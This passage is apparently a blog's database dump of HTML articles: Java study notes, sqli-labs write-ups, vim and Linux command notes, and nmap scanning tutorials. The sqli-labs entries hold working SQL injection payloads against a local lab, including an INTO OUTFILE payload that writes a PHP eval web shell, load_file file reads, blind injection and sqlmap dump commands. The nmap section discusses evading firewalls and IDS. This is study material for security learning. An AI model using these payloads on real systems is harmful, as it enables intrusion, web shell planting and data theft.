style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">一个类实现接口后，必须完全实现接口里的抽象方法</span>(<span style="font-family:宋体">就是重写抽象方法</span><span style="font-family:Calibri">)</span><span style="font-family:宋体">，否则该类就会保留从父接口那儿继承到的抽象方法，该类就必须定义成抽象类</span><span style="font-family:Calibri">(</span><span style="font-family:宋体">变成抽象类了</span><span style="font-family:Calibri">0_o).</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">35.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口不能显示继承任何类，所有接口类型的引用变量都可以直接赋给</span>Object<span style="font-family:宋体">类型的引用变量。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">36.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口与抽象类的区别：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里只能包含抽象方法，静态方法和默认方法，不能为普通方法提供方法实现；抽象类完全可以包含普通方法。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里只能定义静态常量，不能定义普通成员变量；抽象类里既可以定义普通成员变量，也可以定义静态常量。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(3)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里不包含构造器；抽象类里可以包含构造器，抽象类里的构造器不用于创建对象，而是用于给子类继承，完成属于抽象类的初始化操作。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(4)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里不能包含初始化块；但抽象类里完全可以包含初始化块。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(5)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">一个类最多只能有一个直接父类，包括抽象类；但一个类可以直接实现多个接口，通过实现多个接口弥补</span>Java<span style="font-family:宋体">单继承的不足。</span></span></p><p><br/></p>', '笔记', 0, 18, '2018-11-03', 57, -3, 0, '/upload/image/20181103/6428dcbe71692f5c12c611d8e677bc3e.jpg'),
	(90, 'less-7', 'Aomaha', '<p style="text-indent: 2em;">这一关是写入后门。</p><p style="text-indent: 2em;">php的一句话是&lt;?php @eval($_POST[&quot;yourpassword&quot;]); ?&gt;，现在目标就是将这个一句话后门写入网站的php文件中。</p><p style="text-indent: 2em;">首先测试注入点的类型，发现是没有错误回显提示的，可以用&#39;))闭合的注入点。前面我们测试过一些关卡，可以爆出一些信息，这关没得信息回显，所以在前面的关卡中可以用@@basedir和@@datadir显出一些目录信息，然后猜测网站放在www目录下，利用这个方法我得到了我的网站的绝对路径：E:\\\\phpSduty\\\\PHPTutorial\\\\WWW\\\\test1\\\\Less-7\\\\backdoor.php</p><p style="text-indent: 2em;">那么现在就直接用outfile直接写了（我关了mysql的导入目录限制，你写不进可能是这个原因），payload如下：</p><p style="text-indent: 2em;">http://127.0.0.1/test1/Less-7/index.php?id=-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;eros&quot;]); ?&gt;&#39; into outfile &#39;E:\\\\phpSduty\\\\PHPTutorial\\\\WWW\\\\test1\\\\Less-7\\\\backdoor.php&#39;-- a</p><p style="text-indent: 2em;">然后我们用游览器打开这个写入的php文件试试看写入成功了没得：</p><p style="text-indent: 2em;">游览器定位到刚才写入的文件，如下：<br/></p><p style="text-indent: 2em;"><img src="/upload/image/20181103/1541228086103679.jpg" title="1541228086103679.jpg" alt="2.jpg"/></p><p style="text-indent: 2em;">很明显写入成功了，那么我们现在用菜刀连接一下咯：</p><p style="text-indent: 2em;"><img src="/upload/image/20181103/1541228258824845.jpg" title="1541228258824845.jpg" alt="2.jpg"/></p><p style="text-indent: 2em;">菜刀效果如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181103/1541228362537296.jpg" title="1541228362537296.jpg" alt="2.jpg"/><br/></p><p style="text-indent: 2em;">既然导入可以用，那么导出也可以咯，那么现在将index.php的源码导出到info.txt试试:</p><p style="text-indent: 2em;">payload:http://127.0.0.1/test1/Less-7/index.php?id=1&#39;)) union select 1,2,load_file(&#39;E:\\\\phpSduty\\\\PHPTutorial\\\\WWW\\\\test1\\\\Less-7\\\\index.php&#39;) into outfile &#39;E:\\\\phpSduty\\\\PHPTutorial\\\\WWW\\\\test1\\\\Less-7\\\\info.txt&#39;-- a</p><p style="text-indent: 2em;">访问info.txt如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181103/1541229319794530.jpg" title="1541229319794530.jpg" alt="2.jpg"/></p><p style="text-indent: 2em;">很成功，那么就可以想到导出数据库配置文件，或者网站的配置文件直接查看密码啥的了。<br/></p>', 'sql', 0, 1, '2018-11-03', 55, -2, 0, '/upload/image/20181103/dd9f56e1c00436c37b07ea6ac7f49039.jpg'),
	(91, 'less-8', 'Aomaha', '<p style="text-indent: 2em;">这一关是布尔型单引号盲注，就是只能判断注入结果是对还是错，其余没有任何提示和回显，用手工的话太繁琐了，只能用工具了。</p><p style="text-indent: 2em;">原理：</p><p style="text-indent: 2em;">首先需要知道几个常用的ascii，a:97,z:122,A:65,Z:90,0:48,9:57。还有几个常见的mysql函数：ascii()，substr(),前者返回字符串最左边的一个字符的ascii码，后者截取字符串，第二个参数是start，第三个参数是截取的length.所以，我们要比对database()返回值的ascii码，可以这样测试：ascii(substr((select dabase()),1,1))&gt;97，这就是判断database()的返回值的第一个字母是不是位于z字母a之后的字母，然后再一直这样测，知道测到结果不同到达临界值，就知道了所测字母的ascii，然后就知道了所测字母，一直利用这种原理可以把数据库全爆出来。但是操作太繁琐了，所以用工具就好了。</p><p style="text-indent: 2em;">接下来的操作是sqlmap的：</p><p style="text-indent: 2em;">直接上查看数据库的命令sqlmap.py -u &quot;http://127.0.0.1/test1/Less-8/index.php?id=1&quot; --technique B --dbs –batch，</p><p style="text-indent: 2em;">然后查表啥的就指定：-D 数据库名，然后--tables就可以爆出表名了，脱裤就是--dump。</p><p style="text-indent: 2em;">sqlmap.py -u &quot;http://127.0.0.1/test1/Less-8/index.php?id=1&quot; --technique B --columns -T users -D security –batch的显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181103/1541243922579849.jpg" title="1541243922579849.jpg" alt="2.jpg"/></p><p style="text-indent: 2em;">再往下就是脱裤了。<br/></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><br/></p>', 'sql', 0, 4, '2018-11-03', 58, -2, 0, '/upload/image/20181103/e59a20d6a49e05ef7854a847e71d1bf2.jpg'),
	(92, 'less-9/10', 'Aomaha', '<p style="text-indent: 2em;">第九关是基于时间的单引号盲注。</p><p style="text-indent: 2em;">直接给payload：http://127.0.0.1/test1/Less-10/index.php?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))-- a</p><p style="text-indent: 2em;">解释：判断database()的第一个字母是不是s，是就返回0，不是就sleep五秒，你会看到网页比正常访问多刷新了五秒，这就是基于时间的盲注。</p><p style="text-indent: 2em;">第十关是基于时间的双引号盲注。</p><p style="text-indent: 2em;">直接给payload，就是把上面的payload的单引号改成双引号。</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-10/index.php?id=1&quot; and if(ascii(substr(database(),1,1))&gt;120,0,sleep(5))-- a</p><p style="text-indent: 2em;"><strong>注意：上面的盲注payload，在if函数之前的给id赋值，一定要赋值能查到结果的id，不然前面的结果集为空，后面的if函数就直接不执行了，所以这里的id=1,而不能id=999999999</strong><br/></p>', 'sql', 0, 2, '2018-11-04', 55, -2, 0, '/upload/image/20181104/1735078d5665c6b239c43d9a9a2e9f5f.jpg'),
	(93, 'less-17', 'Aomaha', '<p>payload:uname=admin&amp;passwd=ad%27+or+updatexml%281%2Cconcat%280x282b%2Cversion%28%29%2C0x29%29%2C234%29%23&amp;submit=Submit<br/></p>', 'sql', 0, 5, '2018-11-24', 55, -2, 0, '/upload/image/20181124/f1e879ad9d0cdad3c6b5f3fc5a4a06ba.jpg'),
	(94, 'vim编辑器', 'Aomaha', '<p>&nbsp;&nbsp;&nbsp;&nbsp;上个学期撸过《鸟哥的linux私房菜》，只能说太多了，现在过了一个学期，基本上全忘了.....现在打算再次复习一遍吧，现在主要是再复习一边命令，至于linux的一些底层机制等方面由于上学期撸过了，还算记得吧，就不复习了（以后碰到再写吧）。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我打算先从linux的记事本vim编辑器开始。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我直接转载了一篇文章，写的很全。原地址为：<a href="https://www.cnblogs.com/pythonlearing/p/9749338.html">https://www.cnblogs.com/pythonlearing/p/9749338.html</a><br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;转载如下：</p><p>vi的使用<br/>基本上vi可以分为三种状态，分别是一般模式、编辑模式和命令行模式，各模式的功能区分如下：</p><p>一般模式：<br/>以vi打开一个文件就直接进入一般模式了(这是默认的模式)。在这个模式中， 你可以使用上下左右按键来移动光标，你可以使用删除字符或删除整行来处理文件内容， 也可以使用复制、粘贴来处理你的文件数据。</p><p>编辑模式：<br/>在一般模式中可以进行删除、复制、粘贴等的操作，但是却无法编辑文件的内容，只有当到你按下【i, I, o, O, a, A, r, \r\nR】等任何一个字母之后才会进入编辑模式。这时候屏幕的左下方会出现【INSERT或 \r\nREPLACE】的字样，此时才可以进行编辑。而如果要回到一般模式时， 则必须要按下【Esc】即可退出编辑模式。</p><p>命令行模式：<br/>输入【 : / ? 】三个中的任何一个，就可以将光标移动到最底下那一行。在这个模式中， 可以提供查找、读取、存盘、替换字符、离开vi、显示行号等的动作则是在此模式中完成的！</p><p>一般模式可用的按钮说明<br/>移动光标<br/>【h、j、k、l】，分别控制光标左、下、上、右移一格<br/>按【ctrl+b】屏幕往&quot;后&quot;移动一页<br/>按【ctrl+f】屏幕往&quot;前&quot;移动一页</p><p>【n&lt;space&gt;】光标向右移动n个字符<br/>【Home】移动到这一行的最前面字符处:0数字，但不能用数字小键盘上的数字<br/>【End】 移动到这一行的最后面字符处:$，我测试好像不行<br/>【w】光标跳到下个字的开头<br/>【e】光标跳到下个字的字尾</p><p>【H】 光标移动到这个屏幕的最上方那一行的第一个字符<br/>【M】 光标移动到这个屏幕的中间那一行的第一个字符<br/>【L】光标移动到这个屏幕的最下方那一行的第一个字符</p><p>【G】 移动到这个文件的最后一行<br/>【nG】移动到这个文件的第n行(可配合:set nu)<br/>【gg】 移动到这个文件的第一行，相当于1G<br/>【n&lt;Enter&gt;】光标向下移动n行</p><p>查找与替换<br/>【/word】 向光标向下寻找一个名称为word的字符串<br/>【?word】 向光标向上寻找一个名称为word的字符串<br/>【n】 代表重复前一个查找的动作<br/>【N】 与n刚好相反，为【反向】进行行前一个查找动作</p><p>【:n1,n2s/word1/word2/g】&nbsp; n1与n2为数字，在第n1与n2行之间查找word1 这个字符串，并将该字符串替换为word2</p><p>【:1,$s/word1/word2/g】 从第一行到最后一行查找word1字符串，并将该字符串替换为word2<br/>【:1,$s/word1/word2/gc】 从第一行到最后一行查找word1字符串，并将该字符串替换为word2 ，且在替换前提示用户确认是否进行替换</p><p>删除、复制与粘贴</p><p>【x】 为向后删除一个字符 (相当于【del】键)<br/>【X】 为向前删除一个字符(相当于【backspace】键)<br/>【nx】 连续向后删除n个字符</p><p>【dd】 删除光标所在行<br/>【ndd】 删除光标所在的向下n行<br/>【d1G】 删除光标所在行到第一行的所有数据<br/>【dG】 删除光标所在到最后一行的所有数据</p><p>【d$】 删除光标所在处，到该行的最后一个字符<br/>【d0】 删除光标所在处，到该行的最前一个字符</p><p>【yy】 复制光标所在的那一行<br/>【nyy】 复制光标所在的向下n列</p><p>【y1G】 复制光标所在行到第一行的所有数据<br/>【yG】 复制光标所在行到最后一行的所有数据</p><p>【y0】 复制光标所在的那个字符到该行行首的所有数据<br/>【y$】 复制光标所在的那个字符到该行行尾的所有数据</p><p>【p】将已复制的数据在光标下一行粘贴上<br/>【P】 则为贴在光标的上一行</p><p>【u】 恢复前一个操作<br/>【Ctrl+r】重做上一个操作</p><p>【.】 是重复前一个操作</p><p>一般模式切换到编辑模式的可用的按钮说明<br/>【i, I】 进入编辑模式：<br/>i 为【从目前光标所在处插入】<br/>I 为【在目前所在行的第一个非空格符处开始插入】<br/>&nbsp;<br/>【a, A】 进入编辑模式(Insert mode)：<br/>a 为【从目前光标所在的下一个字符处开始插入】<br/>A 为【从光标所在行的最后一个字符处开始插入】</p><p>【o, O】 进入编辑模式：<br/>o 为【在目前光标所在的下一行处插入新的一行】<br/>O 为在目前光标所在处的上一行插入新的一行</p><p>【r, R】 进入取代模式：<br/>r 只会取代光标所在的那一个字符一次<br/>R会一直取代光标所在的文字，直到按下 ESC 为止；</p><p>【Esc】 退出编辑模式，回到一般模式</p><p>一般模式切换到命令行模式可用的按钮说明<br/>【:w】 保存编辑的内容<br/>【:w!】强制写入该文件，但跟你对该文件的权限有关<br/>【:q】 离开vi<br/>【:q!】 不想保存修改强制离开<br/>【:wq】 保存后离开<br/>【:x】 保存后离开<br/>【ZZ】 若文件没有更动，则不保存离开，若文件已经被更改过，则保存后离开</p><p>【:w filename】 将编辑的数据保存成另一个文件（类似另存）<br/>【:r filename】 在编辑的数据中，读入另一个文件的数据。即将【filename】 这个文件的内容加到光标所在行后面。</p><p>【:n1,n2 w filename】 将n1到n2的内容保存成filename这个文件。<br/>【:! command】暂时离开vi 到命令行模式下执行command的显示结果！例如 【:! ls /home】即可在 vi 当中察看/home底下以ls输出的文件信息！</p><p>【:set nu】 显示行号<br/>【:set nonu】 与 set nu 相反，为取消行</p><p>vim的缓存文件、恢复与开启时的警告信息<br/>我们知道一些常用的编辑软件，都有个恢复的功能，就是说当你的系统因为某些原因而导致类似当机的情况时，还可以利用这个恢复功能将之前未保存的数据找回来。我们的VIM也有这个功能。</p><p>当我们在使用vim编辑时，vim会在与被编辑的文件的目录下，再建立一个名为 .filename.swp的文件。如果你的系统因为某些原因断线了， 导致你编辑的文件还没有保存，这个时候 .filenam.swp 就能够发会救援的功能了。</p><p><br/></p>', '编辑器', 0, 23, '2019-01-02', 59, -3, 0, '/upload/image/20190102/0da87b3dbc0a2a2c27d2f8c5e877d24b.png'),
	(95, '导航文件系统', 'aomaha', '<p><strong>此节主要是一些最最基本的命令：<br/></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>用 ls 命令就是列出当前文件夹下的文件和文件夹。用 ls 文件夹 就是列出指定文件夹下的文件和文件夹，比如: ls ~ 就是列出当前用户的用户目录。当然，ls 可以用通配符匹配文件或者模糊目录下的文件。如果有多级目录，可以加上-R参数实现递归遍历目录。平常我们用的多的就是 ls -l 便是用“长”的形式将目录和文件显示出来，可以看到其详细信息，比如权限和修改时间，用户和用户组，以及节点数。此外就是加上-a参数了，就是所谓的显示所有，包括隐藏文件和.和..两个目录，-A和-a相同，除了不显示.和..。-F参数就是可以列出文件的类型，文件后面为星号就是可执行文件，为/就是目录，为@就是链接文件，为|就是管道命令，为=就是套接字。-t参数为按照修改日期来排列，-r为反排列。-S就是按照文件大小排列。此外一个很有用的参数就是-h了，就是可以将-l参数的显示的文件大小的单位转化为让人易读的单位。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;显示当前目录的命令：pwd，是password的缩写，但是和password好像没关系=-= 这个命令很常用。但是注意：此名返回的是目录的逻辑目录，不是物理路径，相当于pwd -L ,而想显示物理路径，需要：pwd -P&nbsp; logical和pysical嘛！</p><p>&nbsp;&nbsp;&nbsp;&nbsp;切换工作目录的命令：cd,没啥讲的，最最基本的，需要注意的就是cd - 代表返回上一级目录，cd ~ 为返回home<br/></p>', '命令', 0, 1, '2019-01-03', 59, -3, 0, '/upload/image/20190103/a35ddd9c3cf9ba9c60534e009ded642f.png'),
	(96, 'nmap入门(一)', '谢灿勇', '<p>端口扫描在百度百科上的定义是：</p><p><strong>端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型(这些网络服务均与端口号相关)，</strong>但是端口扫描不但可以为黑客所利用，同时端口扫描还是网络安全工作者的必备的利器，通过对端口的扫描，了解网站中出现的漏洞以及端口的开放情况，对网站安全方面有着不可或缺的贡献，是你学习网络安全的第一门课程的首选</p><p>目前在市面上主要的端口扫描工具是X_Scan、SuperScan、nmap，其中在这里主推的是nmap，因为nmap具有以下的这一些优点：</p><p>1、多种多样的参数，丰富的脚本库，满足用户的个人定制需求，其中脚本库还提供了很多强大的功能任你选择</p><p>2、强大的可移植性，基本上能在所有的主流系统上运行，而且代码是开源的</p><p>3、详细的文档说明，和强大的社区团队进行支持，方面新人上手</p><p>Nmap是一款开源免费的网络发现（Network Discovery）和安全审计（Security \r\nAuditing）工具，但是nmap也是有一些缺点的，比如说上手较难，但是难上手是相对的，与其他达到这种功能性的软件产品相比，还是比较容易上手的，但是这也不妨碍nmap成为世界千万安全专家列为必备的工具之一，在其中的一些影视作品中《黑客帝国2》、《特警判官》中都有亮相</p><p>废话不多说，开始今天的nmap学习：</p><p>nmap的安装：直接从百度上下载，然后安装的步骤跟其他的软件一样，最后确认安装成功只需要在命令行中输入nmap回车，有相关的参数输出即为安装成功，安装的具体步骤可以查看：<a href="http://jingyan.baidu.com/article/5bbb5a1b1e0a7713eba179cb.html" target="_blank">http://jingyan.baidu.com/article/5bbb5a1b1e0a7713eba179cb.html</a>，在此就不多说了</p><p><span style="color: #2bee11;"><strong>Nmap包含四项基本功能：</strong></span></p><ol class=" list-paddingleft-2"><li><p><strong>主机发现（Host Discovery）</strong></p></li><li><p><strong>端口扫描（Port Scanning）</strong></p></li><li><p><strong>版本侦测（Version Detection）</strong></p></li><li><p><strong>操作系统侦测（Operating System Detection）</strong></p></li></ol><p>下面就从主机发现一步一步进行探讨</p><p>主机发现顾名思义就是发现所要扫描的主机是否是正在运行的状态，接下来就来一个简单例子</p><p>例子要求：获取http://nmap.org 的主机是否开启</p><p>输入命令：nmap -F -sT -v nmap.org</p><p>-F：扫描100个最有可能开放的端口 &nbsp; -v 获取扫描的信息 &nbsp; -sT：采用的是TCP扫描 不写也是可以的，默认采用的就是TCP扫描</p><p>运行如下：</p><p><img src="/upload/image/20190302/1551499046640855.png" alt=""/></p><p>由图中的1，我们可以发现对URL进行解析花了16.5秒，这个地方花费的时间是可以进行优化的，优化的方法会稍后介绍</p><p>图中的2，是总共的运行时间</p><p>图中的3是说明有96个端口被屏蔽了，也就是说明了网站的防火墙是开启的，因为没有开启防火墙是不会对端口进行屏蔽的，</p><p>补充说明：</p><p>端口端口一般是有下面这几种状态的</p><table width="599" align="left"><tbody><tr class="firstRow"><td style="text-align: center;"><span style="font-size: 18pt;"><strong>状态</strong></span></td><td style="text-align: center;"><strong><span style="font-size: 18pt;">详细的参数说明</span></strong></td></tr><tr><td><span style="font-size: 16px;"><strong>&nbsp;Open</strong></span></td><td><span style="font-size: 16px;"><strong>&nbsp;端口开启，数据有到达主机，有程序在端口上监控</strong></span></td></tr><tr><td><span style="font-size: 16px;"><strong>&nbsp;Closed</strong></span></td><td><span style="font-size: 16px;"><strong>&nbsp;端口关闭，数据有到达主机，没有程序在端口上监控</strong></span></td></tr><tr><td><span style="font-size: 16px;"><strong>&nbsp;Filtered</strong></span></td><td><span style="font-size: 16px;"><strong>&nbsp;数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤</strong></span></td></tr><tr><td><span style="font-size: 16px;"><strong>&nbsp;UnFiltered</strong></span></td><td><span style="font-size: 16px;"><strong>&nbsp;数据有到达主机，但是不能识别端口的当前状态</strong></span></td></tr><tr><td><span style="font-size: 16px;"><strong>&nbsp;Open|Filtered</strong></span></td><td><span style="font-size: 16px;"><strong>&nbsp;端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中</strong></span></td></tr><tr><td><p><strong style="font-size: 16px;">&nbsp;Closed|Filtered</strong></p></td><td><span style="font-size: 16px;"><strong>&nbsp;只发生在IP ID idle扫描</strong></span></td></tr></tbody></table><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>图中的4是本次返回的关键信息，其中我们要主要关注的是端口号，端口状态，端口上的服务</p><p>那你可能就会要问为什么要关注这些端口呢？那这个问题就要转到探讨为什么要进行扫描？</p><p>扫描对于黑客和安全人员来说，主要的流程是这样的</p><p><img src="/upload/image/20190302/1551499047667571.png" alt=""/></p><p><span style="background-color: #ffff00;">上面的图中的IP写错了，应该改为FTP</span></p><p>从这个图中我们不难发现，我们主要关注的区域就是这些内容</p><p>接下来就来讨论下面上面提出来的问题？怎样对URL解析的时间进行优化，在Nmap重提供了不进行解析的参数(-n),这样就不会对域名进行解析了</p><p>其中关于域名解析的相关参数还有：</p><p><strong>-R 为所有的目标主机进行解析</strong></p><p><strong>--system-dns 使用系统域名解析器进行解析，这个解析起来会比较慢</strong></p><p><strong>--dns-server 服务器选择DNS解析</strong></p><p>说到-R注释的意思你会有所体会，其实nmap的扫描解析不止是对一个目标主机进行解析，还可以对一定范围内的目标主机群进行解析</p><p>例如：查找45.33.49.119-120的主机的状态以及端口状态</p><p>分析：</p><p>1、虽然查找的主机的数量不多，但是这样查找起来也是很浪费时间的， 所有我们可以通过使用快速查找的方法来节约时间</p><p>快速查找端口方法的原理如下：</p><p><strong>默认的情况下，我们的查找是查找最有可能开放的1000端口，但是使用快速端口查找(参数 -F )会查找最有可能开放的100个端口，这样也就节约了10倍的时间</strong></p><p>&nbsp;2、这里我们需要获取端口的状态，所以就不能使用参数(-sn)，这个参数是可以跳过端口扫描，直接进行主机发现的</p><p>输入命令：nmap -F -sT -v -n&nbsp;45.33.49.119-120 &nbsp; &nbsp;&nbsp;<span style="background-color: #ffff00;">&nbsp;45.33.49.119:nmap.org的IP地址</span></p><p><span style="background-color: #ffff00;">PS:1、-sn参数只能扫描的主机，不能扫描端口，另一个参数也要特别注意的是（-PE）通过ICMP echo判定主机是否存活</span></p><p>运行情况如下：</p><p><img src="/upload/image/20190302/1551499047505429.png" alt=""/></p><p>图片中的1处指的是，采用sT的扫描方法，这种扫描方法准确，速度快，但是这样的扫描容易被防火墙和IDS发现并记录，所以这种方法，实际中并不多用</p><p>由图中的3处我们可以知道在不进行解析的情况下扫描用时为26.92秒，比解析的时候用的时间节约了不少</p><p>图中的4说明了扫描了2个主机，然后只有一个主机为开启</p><p>&nbsp;提示：</p><p><strong>在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键</strong></p><p>好了，示例也讲完了，下面我们就来分析一下扫描的各种方法：</p><p><span style="font-size: 14pt; color: #00ccff;"><strong>端口扫描</strong></span></p><p><span style="font-size: 15px;"><strong>1、TCP扫描（-sT）</strong></span></p><p>这是一种最为普通的扫描方法，这种扫描方法的特点是：扫描的速度快，准确性高，对操作者没有权限上的要求，但是容易被防火墙和IDS(防入侵系统)发现</p><p>运行的原理：通过建立TCP的三次握手连接来进行信息的传递</p><p>① Client端发送SYN；</p><p>② Server端返回SYN/ACK，表明端口开放；</p><p>③ Client端返回ACK，表明连接已建立；</p><p>④ Client端主动断开连接。</p><p><img src="/upload/image/20190302/1551499047387782.jpg" alt=""/></p><p><strong>&nbsp;2、SYN扫描（-sS）</strong></p><p>这是一种秘密的扫描方式之一，因为在SYN扫描中Client端和Server端没有形成3次握手，所以没有建立一个正常的TCP连接，因此不被防火墙和日志所记录，一般不会再目标主机上留下任何的痕迹，但是这种扫描是需要root权限（对于windows用户来说，是没有root权限这个概念的，root权限是linux的最高权限，对应windows的管理员权限）</p><p>运行的原理图如下：</p><p><img src="/upload/image/20190302/1551499047207569.jpg" alt=""/></p><p><span style="font-size: 15px;"><strong><span style="color: #000000;">3、NULL扫描</span></strong></span></p><p>NULL扫描是一种反向的扫描方法，通过发送一个没有任何标志位的数据包给服务器，然后等待服务器的返回内容。<strong>这种扫描的方法比前面提及的扫描方法要隐蔽很多，但是这种方法的准确度也是较低的</strong>， 主要的<strong>用途是用来判断操作系统是否为windows</strong>，因为windows不遵守RFC 793标准，不论端口是开启还是关闭的都返回RST包</p><p><img src="/upload/image/20190302/1551499047559751.jpg" alt=""/></p><p>但是虽然NULL具有这样的一些用处，但是本人却认为不宜使用NULL</p><p>1、NULL方法的精确度不高，端口的状态返回的不是很准确</p><p>2、要获取目标主机的运行系统，可以使用参数(-O),来获取对于一些操作系统无法准确判断的，可以加上参数(-osscan-guess)</p><p>3、NULL扫描易被过滤</p><p><span style="font-size: 15px;"><strong>4、FIN扫描</strong></span></p><p>FIN扫描的原理与NULL扫描的原理基本上是一样的在这里就不重复了</p><p><span style="font-size: 15px;"><strong>5、ACK扫描</strong></span></p><p>ACK扫描的原理是发送一个ACK包给目标主机，不论目标主机的端口是否开启，都会返回相应的RST包，通过判断RST包中的TTL来判断端口是否开启</p><p>运行原理图：</p><p><img src="/upload/image/20190302/1551499048202373.jpg" alt=""/></p><p>TTL值小于64端口开启，大于64端口关闭</p><p>大致上主要的扫描方法就是这些，除了我们可以按照这样些参数去执行扫描外，还可以自己定义一个TCP扫描包</p><p><span style="font-size: 15px;"><strong>6、自定义TCP扫描包的参数为（--scanflags）</strong></span></p><p>例如：定制一个包含ACK扫描和SYN扫描的安装包</p><p>命令：nmap --scanflags ACKSYN&nbsp;nmap.org</p><p><img src="/upload/image/20190302/1551499048200097.png" alt=""/></p><p>&nbsp;好了，接下来还有各种扫描方法的端口列表参数</p><p><strong>-PS 端口列表用,隔开[tcp80 syn 扫描]</strong><br/><strong>-PA 端口列表用,隔开[ack扫描](PS+PA测试状态包过滤防火墙【非状态的PA可以过】)【默认扫描端口1-1024】</strong><br/><strong>-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]</strong></p><p><span style="font-size: 15px; color: #00ccff;"><strong>其他的常见命令</strong></span></p><p><span style="font-size: 15px; color: #000000;"><strong>输出命令</strong></span></p><p><span style="font-size: 15px; color: #000000;">-oN 文件名 输出普通文件</span></p><p><span style="font-size: 15px; color: #000000;">-oX 文件名 输出xml文件</span></p><p><span style="font-size: 15px; color: #000000;"><strong>错误调试：</strong></span></p><p><span style="font-size: 15px; color: #000000;">--log-errors 输出错误日志</span></p><p><span style="font-size: 15px; color: #000000;">--packet-trace 获取从当前主机到目标主机的所有节点</span></p><p><span style="font-size: 15px; color: #000000;">其他的相关参数可以参考：http://www.2cto.com/Article/201203/125686.html 到时候需要再进行查找</span></p><p><span style="line-height: 1.5;">相关资料：</span></p><p>http://www.tuicool.com/articles/ZBvmYrN</p><p>http://www.2cto.com/Article/201203/125686.html</p><p><span style="color: #ff0000;">在此特别感谢各位前辈为nmap提供了为数不多的宝贵资料</span></p><p><br/></p>', 'nmap', 1, 13, '2019-03-02', 60, -2, -1, '/upload/image/20190302/3362c8898a31ac4c9262d59e0ed5cceb.jpg'),
	(97, 'nmap入门(二)', '谢灿勇', '<p>接着讲上节的内容，上节中提到了一个时间优化的问题是使用参数-n,通过不解析地址来进行优化时间的，但是优化时间的方法还有很多，比如说我们可以通过时间优化(0-5)，指定单位时间内的探针数，设置组的大小</p><p><span style="font-size: 15px;"><strong>时间优化(0-5)</strong></span></p><p>时间优化的参数是(-T0~5)，最快的扫描速度为-T5,最慢的扫描速度为-T0<strong>,实现的原理：通过设置各个端口的扫描周期，从而来控制整个扫描的时间，比如说T0各个端口的扫描周期大约为5分钟，而T5各个端口的扫描周期为5ms</strong>，但是过快的扫描也是有缺点的，扫描的周期过快，会很容易被防火墙和IDS发现并记录，因为防火墙大多数会将端口周期过段识别为扫描从而屏蔽掉，如果不对其进行设置的话，默认值为T4</p><p>--min-hostgroup/--max-hostgroup size 设置组的大小<br/>--min-parallelism/--max-parellelism time指定时间内的探针数</p><p>具体的使用方法就不做介绍了，有兴趣的话，可以试一试研究一下变知道怎样使用了</p><p>在上节中还讲漏了一个知识点获取指定端口的参数（-p），这个参数的意义在于对于我们有时候只想监控某个特定的端口的状态，这个参数是即为有用的，可以节约了不少的时间</p><p>例如：监控nmap.org的80端口的状态</p><p>命令：nmap -p 80 nmap.org</p><p>接下来就进行这一节的主要内容，如果上节没有了解清楚的同学，建议返回上节理解清楚再开始这一节</p><p>这一节我们就来讲讲怎<strong>样规避被防火墙或IDS发现的风险以及操作的步骤</strong></p><p>上节中我们假设的是在一个网络安全较为薄弱的情况下就可以正常进行的，但是正常的网站或者个人都是对安全有一定的防范的，网站中基本上都会存在安全狗、防火墙等规避风险的措施，个人电脑也会安装各种安全软件，所以对于做扫描工作的人来说，我们不知道通过扫描获取相关的信息，同时也要保护好自己的隐私，比如IP等信息，防止被防火墙或者是网络日志所记录下来</p><p>在讲这节之前我们来了解一下什么事防火墙？</p><p>防火墙的原理图：</p><p><img src="/upload/image/20190302/1551522775885671.jpg" alt=""/></p><p>防火墙是通过在客户端与服务器端之间搭建一个监控（运行的原理有点像Fiddler），通过对特定开放的端口进行屏蔽掉，从而达到网络安全的作用，防火墙在其功能上也会有一些其他的功能，这个要看防火墙的实际情况</p><p><span style="color: 